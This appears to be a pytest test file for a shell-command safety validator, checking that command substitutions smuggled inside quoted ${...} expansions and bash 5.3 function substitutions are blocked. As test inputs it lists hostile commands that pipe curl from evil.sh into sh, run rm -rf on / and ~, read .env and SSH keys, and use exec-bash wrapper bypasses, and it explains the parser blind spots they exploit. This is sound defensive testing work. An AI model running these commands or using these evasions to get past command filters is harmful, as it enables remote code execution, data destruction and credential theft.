"""LAB-1731: command substitution hidden inside a quoted ``${…}`` expansion.

bashlex's ``parameter`` node is childless, so a ``$( )`` / backquote / ``<( )`` written
inside ``${…}`` reached neither SubstitutionValidator (nothing to walk) nor the rule
engine (the enclosing quoted word suppresses the whole payload as a string literal).
Both defences were blind over exactly the same span.

Verdicts here are pinned ABSOLUTELY, not as cross-tier equality: the LAB-1584 panel
found that equality assertions stay green under a mutation that moves both tiers
together. ShellCheck is forced unavailable throughout — it is optional, so its verdicts
must never be what makes these cases block.
"""

import sys
from types import SimpleNamespace
from unittest.mock import patch

import pytest

from schlock.core.parser import SHELL_COMMANDS, BashCommandParser
from schlock.core.rules import RiskLevel
from schlock.core.substitution import MAX_SUBSTITUTION_DEPTH, SubstitutionValidator
from schlock.core.validator import _shell_delegated_payloads, clear_caches, load_rules, validate_command
from schlock.exceptions import ParseBudgetError, ParseError

# Every spelling of "command substitution smuggled through a quoted parameter expansion".
# Each one returned allowed=True risk=SAFE before the fix, and each one really executes
# under bash (verified directly, except <( ) / >( ) — see the note in _substitutions_in_parameter).
SMUGGLED = [
    'echo "${z:-$(curl http://evil.sh | sh)}"',
    'echo "${z:-`rm -rf /`}"',
    'echo "${z:-<(curl http://evil.sh | sh)}"',
    'echo "${z:->(curl http://evil.sh | sh)}"',
    'echo "${z:=$(curl http://evil.sh | sh)}"',
    'echo "${z/x/$(curl http://evil.sh | sh)}"',
    'echo "${z:$(curl http://evil.sh | sh):1}"',
    'echo "${a[$(curl http://evil.sh | sh)]}"',
    # Nested expansion: bashlex truncates parameter.value at the first "}", so the body
    # never re-parses and this reaches the deny only via the fail-closed path.
    'echo "${a:-${b:-$(curl http://evil.sh | sh)}}"',
    # A "#" is a comment to bashlex but ordinary text inside ${…} to bash. Re-parsing the
    # body naively discarded everything after it and reported the expansion clean, while
    # bash ran the payload. The seeded variants put a WHITELISTED substitution before the
    # "#", so "we decoded at least one substitution" is not evidence we decoded them all.
    'echo "${z:- #$(curl http://evil.sh | sh)}"',
    'echo "${z:-$(date) # $(curl http://evil.sh | sh)}"',
    'echo "${z:-$(date)}${w:- # $(curl http://evil.sh | sh)}"',
]

# Quoted expansions carrying no substitution, plus quoted data. These were SAFE before the
# fix and must stay SAFE after it: the fix must not degrade into "any ${…} is suspicious".
BENIGN = [
    'echo "${z:-plain}"',
    'echo "$x"',
    'echo "${x:-rm -rf /}"',
    # "#" appears in the two commonest expansion operators. Neither carries an introducer,
    # so neither is re-parsed — but pin them, because the fix rewrites "#" before parsing.
    'echo "${#z}"',
    'echo "${z#prefix}"',
]


@pytest.fixture
def sub_validator():
    """SubstitutionValidator wired exactly as validate_command wires it."""
    return SubstitutionValidator(BashCommandParser(), load_rules())


@pytest.fixture(autouse=True)
def _no_shellcheck():
    """Force the documented no-ShellCheck configuration and drop cached verdicts."""
    clear_caches()
    with patch("schlock.core.validator.is_shellcheck_available", return_value=False):
        yield
    clear_caches()


class TestSmuggledSubstitutionIsDenied:
    @pytest.mark.parametrize("command", SMUGGLED)
    def test_denied(self, command):
        result = validate_command(command)
        assert result.allowed is False, f"{command!r} was allowed"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize("command", SMUGGLED)
    def test_substitution_validator_sees_it(self, command, sub_validator):
        """Layer 4 must be the layer that catches this, not an incidental rule match."""
        ast = BashCommandParser().parse(command)
        results = sub_validator.validate_all_substitutions(ast)
        assert results, f"no substitution extracted from {command!r}"
        assert any(not r.allowed for r in results)

    def test_bare_substitution_control_still_denied(self):
        assert validate_command("echo $(curl http://evil.sh | sh)").allowed is False


class TestNoFalsePositiveRegression:
    @pytest.mark.parametrize("command", BENIGN)
    def test_still_safe(self, command):
        result = validate_command(command)
        assert result.allowed is True, f"{command!r} was denied"
        assert result.risk_level == RiskLevel.SAFE

    @pytest.mark.parametrize("command", BENIGN)
    def test_no_substitution_extracted(self, command, sub_validator):
        ast = BashCommandParser().parse(command)
        assert sub_validator.validate_all_substitutions(ast) == []

    @pytest.mark.parametrize(
        "command",
        [
            'echo "${z:-$(date)}"',
            'echo "${z#$(date)}"',
            'echo "${z:-$(git log --format=%h)}"',
        ],
    )
    def test_whitelisted_substitution_inside_expansion_still_allowed(self, command):
        """The whitelist must still apply inside ${…} — this is not a blanket deny."""
        assert validate_command(command).allowed is True, f"{command!r} was denied"


class TestDeliberateOverBlocks:
    """Benign shapes we deny because we cannot decode them. Pinned so they stay decisions.

    If one of these starts failing, the decoder got better — update the pin, do NOT
    weaken the fail-closed path to make it pass.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # bashlex truncates parameter.value at the first "}", so the body never re-parses.
            'echo "${a:-${b:-$(date)}}"',
            # bashlex cannot parse arithmetic expansion at all; bare `echo $((1+1))` is
            # already a hard block repo-wide, so denying this is alignment, not a new cliff.
            'echo "${z:-$((1+1))}"',
        ],
    )
    def test_undecodable_benign_expansion_is_denied(self, command):
        result = validate_command(command)
        assert result.allowed is False, f"{command!r} now decodes — update the pin"
        assert result.risk_level == RiskLevel.BLOCKED

    def test_bare_arithmetic_is_the_existing_baseline(self):
        """The arithmetic pin above only aligns with what schlock already did."""
        assert validate_command("echo $((1+1))").allowed is False


class TestUnparseableExpansionFailsClosed:
    def test_introducer_with_unbalanced_body_is_denied(self, sub_validator):
        """An expansion we cannot re-parse but that carries an introducer must not pass."""
        ast = BashCommandParser().parse('echo "${z:-$(curl }"')
        results = sub_validator.validate_all_substitutions(ast)
        assert results and any(not r.allowed for r in results)

    def test_parseable_body_that_decodes_to_nothing_still_denies(self, sub_validator):
        """A body we tokenized differently from bash comes back empty-handed — deny it.

        Unreachable through bashlex today: every body that re-parses also decodes at least
        one substitution, and the ones that do not parse fail closed one branch earlier. It
        is pinned directly because this is the GENERAL form of the ``#`` bug — bashlex read
        the body under different rules than bash and handed back nothing — and "we found
        nothing" must never be recorded as "there is nothing".
        """
        node = SimpleNamespace(kind="parameter", value="z:-$(curl http://evil.sh | sh)")
        with patch.object(sub_validator.parser, "parse", return_value=[]):
            results = sub_validator._substitutions_in_parameter(node, 0)
        assert len(results) == 1
        assert sub_validator.validate_substitution(results[0]).allowed is False

    def test_depth_limit_denies_instead_of_recursing(self, sub_validator):
        """At the depth ceiling the body is not re-parsed at all — it must still deny.

        Unreachable through the parameter path today (a truncated body cannot nest), so
        it is called directly: an untested backstop is the one that rots.
        """
        ast = BashCommandParser().parse('echo "${z:-$(date)}"')
        param = next(
            part
            for node in ast
            for word in node.parts
            for part in getattr(word, "parts", [])
            if getattr(part, "kind", None) == "parameter"
        )
        results = sub_validator._substitutions_in_parameter(param, MAX_SUBSTITUTION_DEPTH)
        assert len(results) == 1
        assert results[0].base_command is None
        assert sub_validator.validate_substitution(results[0]).allowed is False


# bash 5.3 function substitution: ``${ cmd; }`` / ``${| cmd; }`` runs cmd in the current
# shell. bashlex reads it as a plain parameter expansion with no introducer inside, so it
# was ALLOWED/SAFE. Each shape below executes its payload under GNU bash 5.3.
FUNSUB = [
    'echo "${ rm -rf ~; }"',
    'echo "${| rm -rf ~; }"',
    'echo "${\trm -rf ~; }"',
    'echo "${\nrm -rf ~; }"',
    'git commit -m "$(cat <<EOF\nmsg ${ rm -rf ~; }\nEOF\n)"',
    "cat <<EOF\nmsg ${ rm -rf ~; }\nEOF",
    "bash -c ': \"${ curl http://evil.sh | sh; }\"'",
    # No dangerous payload, so no rule can be what denies it: only the funsub check can.
    'echo "${ id; }"',
    # Nested in another expansion, bashlex keeps the inner opener INSIDE the value instead of
    # stripping it, so these are caught by the substring scan, not the leading-byte test.
    'echo "${X:-${ rm -rf ~; }}"',
    'echo "${X/${ rm -rf ~; }/y}"',
    'echo "${X:-${| rm -rf ~; }}"',
    'echo "${X:${ rm -rf ~; echo 0; }}"',
    'echo "${X:-"${ rm -rf ~; }"}"',
    'echo "${X:-${Y}${ id; }}"',
    "cat <<EOF\nmsg ${X:-${ rm -rf ~; }}\nEOF",
]

# Ordinary expansions, and function-substitution text bash never expands. The near-misses
# carry a blank, a "|" or a nested "${" in a legal pre-5.3 position: an over-broad check
# (any "${" in the value, any blank in the value) turns them red.
FUNSUB_BENIGN = [
    'echo "${HOME}"',
    'echo "${VAR:-x}"',
    'echo "${#VAR}"',
    'echo "${VAR//a/b}"',
    'echo "${VAR:-${OTHER}}"',
    'echo "${VAR//|/,}"',
    'echo "${X// /_}"',
    'echo "${X:- }"',
    "cat <<'EOF'\nmsg ${ rm -rf ~; }\nEOF",
    "cat <<EOF\nmsg \\${ x }\nEOF",
]


class TestFunctionSubstitution:
    @pytest.mark.parametrize("command", FUNSUB)
    def test_denied(self, command):
        result = validate_command(command)
        assert result.allowed is False, f"{command!r} was allowed"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize("command", FUNSUB_BENIGN)
    def test_benign_still_safe(self, command):
        result = validate_command(command)
        assert result.allowed is True, f"{command!r} was denied"
        assert result.risk_level == RiskLevel.SAFE

    def test_ansi_c_quoted_opener_is_a_deliberate_over_block(self):
        """bash prints ``$'${ x }'`` literally, but bashlex hands it over as a parameter node.

        Denying it fails closed on a string nobody writes. Pinned so it stays a decision; do not
        special-case ``$'…'`` to make it pass.
        """
        result = validate_command("echo $'${ x }'")
        assert result.allowed is False
        assert result.risk_level == RiskLevel.BLOCKED


# A substitution the top-level walkers catch in an argument word, paired with the check that
# names it there. Inside ``${…}`` each one rated HIGH ("Unknown command in substitution"), which
# the permissive preset allows: bashlex's childless ``parameter`` node kept every walker out of
# the body, so only SubstitutionValidator saw it.
WALKER_CAUGHT = [
    ("timeout 10 exec bash", "wrapper command bypass"),
    ("nice exec bash", "wrapper command bypass"),
    ("env exec bash", "wrapper command bypass"),
    ("command exec bash", "wrapper command bypass"),
    ('timeout 5 bash <<< "rm -rf /"', "Shell-delegated payload"),
    ('nice bash <<< "rm -rf /"', "Shell-delegated payload"),
    ('stdbuf -o0 bash <<< "rm -rf /"', "Shell-delegated payload"),
    ('env FOO=1 bash <<< "rm -rf /"', "Shell-delegated payload"),
    ('rbash <<< "rm -rf /"', "Shell-delegated payload"),
    ('csh <<< "rm -rf /"', "Shell-delegated payload"),
    ('tcsh <<< "rm -rf /"', "Shell-delegated payload"),
    ("watch -n 5 git -c core.pager=/bin/sh log", "Shell-delegated payload"),
]

# Caught in an argument word by a rule over the raw body text. A quoted ``"${…}"`` word was one
# suppressed literal, and the raw pass gave its body no segment of its own, so each of these was
# SAFE or HIGH inside ``${…}``. The metacharacter inside quotes is what breaks the one other view
# of the body: SubstitutionValidator's dequoted ``cat x|y .env`` re-reads as a pipeline.
RAW_BODY_CAUGHT = [
    'cat "x|y" .env',
    'cat "$HOME/a;b/.env"',
    'cat "$HOME/R&D/.kube/config"',
    'cat "a\\"b" ~/.ssh/id_ed25519',
    'chroot "/mnt/R&D" /bin/bash',
    'export X="a;b" B_KEY=v',
    'timeout 5 bash -c "echo" <<< "rm -rf /"',
]


class TestParameterBodyRatesAsArgumentWord:
    """A substitution inside ``${…}`` rates as, and is caught by, what catches it in an argument word."""

    @pytest.mark.parametrize(("inner", "check"), WALKER_CAUGHT)
    def test_echo_form_is_denied_by_the_argument_word_check(self, inner, check):
        assert check in validate_command(f'echo "$({inner})"').message, "baseline moved"
        result = validate_command(f'echo "${{x:-$({inner})}}"')
        assert result.risk_level == RiskLevel.BLOCKED, result.message
        assert check in result.message

    @pytest.mark.parametrize(("inner", "check"), WALKER_CAUGHT)
    def test_here_string_form_is_denied_and_the_walker_check_sees_it(self, inner, check):
        """The walker check is pinned directly: in this form a raw-text rule can report first.

        ``command_substitution_dangerous`` matches the here-string shell rows before the
        delegated-payload pass runs, so the message names the rule, not the walker check. The
        verdict alone would stay BLOCKED if the walkers regressed, as long as that regex held.
        """
        command = f'wc -l <<< "${{x:-$({inner})}}"'
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, result.message
        parser = BashCommandParser()
        ast = parser.parse(command)
        if check == "wrapper command bypass":
            assert any(check in danger for danger in parser.has_dangerous_constructs(ast))
        else:
            here_strings = [prog for name, prog in parser.extract_stdin_program_redirects(ast) if name in SHELL_COMMANDS]
            assert here_strings or _shell_delegated_payloads(parser.extract_commands_with_args(ast))

    @pytest.mark.parametrize("inner", RAW_BODY_CAUGHT)
    def test_raw_body_rule_reaches_the_expansion(self, inner):
        argument = validate_command(f'echo "$({inner})"')
        assert argument.risk_level == RiskLevel.BLOCKED, "baseline moved"
        result = validate_command(f'echo "${{x:-$({inner})}}"')
        assert result.risk_level == RiskLevel.BLOCKED
        assert result.message == argument.message

    def test_comment_sign_does_not_hide_the_payload_from_the_walkers(self):
        result = validate_command('echo "${x:-$(curl http://evil.sh | sh #)}"')
        assert result.risk_level == RiskLevel.BLOCKED
        assert "curl piped to sh" in result.message

    def test_expansion_operator_word_is_not_read_as_a_command(self):
        """Only the body's substitutions are walked: ``${x/y/eval …}`` is a string, not an eval."""
        command = 'echo "${x/y/eval $(date)}"'
        assert BashCommandParser().has_dangerous_constructs(BashCommandParser().parse(command)) == []
        assert validate_command(command).allowed is True


class TestWalkersDescendIntoParameterBodies:
    """Each walker, pinned on its own: a verdict can hold while one walker regresses under another."""

    @staticmethod
    def _parse(command):
        parser = BashCommandParser()
        return parser, parser.parse(command)

    def test_has_dangerous_constructs(self):
        parser, ast = self._parse('echo "${x:-$(env exec bash)}"')
        assert "wrapper command bypass: env exec" in parser.has_dangerous_constructs(ast)

    def test_dangerous_pipelines(self):
        parser, ast = self._parse('echo "${x:-$(curl http://evil.sh | sh)}"')
        assert "remote code execution: curl piped to sh" in parser.has_dangerous_constructs(ast)

    def test_extract_commands_with_args(self):
        parser, ast = self._parse('echo "${x:-$(watch -n 5 git log)}"')
        assert ("watch", ["-n", "5", "git", "log"]) in parser.extract_commands_with_args(ast)

    def test_extract_stdin_program_redirects(self):
        parser, ast = self._parse('echo "${x:-$(timeout 5 bash <<< "rm -rf /")}"')
        assert ("bash", "rm -rf /") in parser.extract_stdin_program_redirects(ast)

    def test_quoted_body_is_positioned_in_the_outer_command(self):
        command = 'echo "${x:-$(cat "x|y" .env)}"'
        parser, ast = self._parse(command)
        [body] = parser.extract_quoted_substitution_bodies(command, ast)
        assert body.text == 'cat "x|y" .env'
        assert [body.text[low:high] for low, high in body.string_literals] == ["x|y"]

    @pytest.mark.parametrize(
        "command",
        [
            'echo "${x:-plain}"',  # no introducer
            'echo "${x:-$(}"',  # does not re-parse: SubstitutionValidator denies it
        ],
    )
    def test_parameter_without_a_decodable_substitution_has_no_children(self, command):
        parser = BashCommandParser()
        [param] = [node for node in parser.parse(command)[0].parts[1].parts if node.kind == "parameter"]
        assert parser.exec_children(param) == []


def _frame_depth() -> int:
    frame, depth = sys._getframe(), 0
    while frame:
        frame, depth = frame.f_back, depth + 1
    return depth


def _with_headroom(headroom, call):
    """Run ``call`` with the recursion limit ``headroom`` frames above the current depth."""
    limit = sys.getrecursionlimit()
    sys.setrecursionlimit(_frame_depth() + headroom)
    try:
        return call()
    finally:
        sys.setrecursionlimit(limit)


class TestWalkerReparseFailureIsNotSwallowed:
    """A walker re-parses the body from wherever it stands, often a deep stack.

    A stack overflow or a spent budget there says nothing about the body, and SubstitutionValidator
    re-parses the same body from a shallow stack and rates it HIGH, which the permissive preset
    allows. So the walker must raise, not report "no substitutions". Real bash runs
    ``{ { … echo "${x:-$(command exec bash)}"; }; }`` at any nesting depth.

    Scanned over every stack headroom rather than pinned at one depth: the headroom at which the
    re-parse, and only the re-parse, overflows differs per Python version.
    """

    COMMAND = 'echo "${x:-$(command exec bash)}"'

    def test_walker_never_reports_an_empty_body_for_lack_of_stack(self):
        parser = BashCommandParser()
        [param] = [part for part in parser.parse(self.COMMAND)[0].parts[1].parts if part.kind == "parameter"]
        for headroom in range(1, 120):
            try:
                children = _with_headroom(headroom, lambda: parser.exec_children(param))
            except (ParseError, RecursionError):
                continue
            assert children, f"re-parse swallowed at headroom {headroom}"

    def test_spent_budget_is_raised(self):
        parser = BashCommandParser()
        [param] = [part for part in parser.parse(self.COMMAND)[0].parts[1].parts if part.kind == "parameter"]
        with patch.object(parser, "parameter_body", side_effect=ParseBudgetError("spent")), pytest.raises(ParseBudgetError):
            parser.exec_children(param)

    def test_verdict_is_blocked_at_every_headroom(self):
        for headroom in range(40, 400, 3):
            clear_caches()
            result = _with_headroom(headroom, lambda: validate_command(self.COMMAND))
            assert result.risk_level == RiskLevel.BLOCKED, f"headroom {headroom}: {result.message}"


class TestShiftPositions:
    def test_a_node_linked_twice_is_shifted_once(self):
        """bashlex links a function's name and body in ``parts`` and again in ``.name``/``.body``."""
        command = 'echo "${x:-$(f() ( echo "a|b" ; cat .env ); f)}"'
        parser = BashCommandParser()
        [body] = parser.extract_quoted_substitution_bodies(command, parser.parse(command))
        assert body.text.startswith("f() (")
        assert [body.text[low:high] for low, high in body.string_literals] == ["a|b"]
